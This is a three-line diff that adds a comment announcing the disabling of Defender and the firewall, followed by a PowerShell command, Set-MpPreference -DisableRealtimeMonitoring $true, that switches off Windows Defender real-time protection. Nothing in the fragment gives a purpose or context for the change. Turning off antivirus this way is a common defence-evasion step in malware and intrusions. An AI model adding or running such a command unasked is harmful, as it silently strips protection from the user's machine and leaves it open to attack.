@@ -1,0 +1,3 @@
+#Defender disable #Firewall disable
+
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
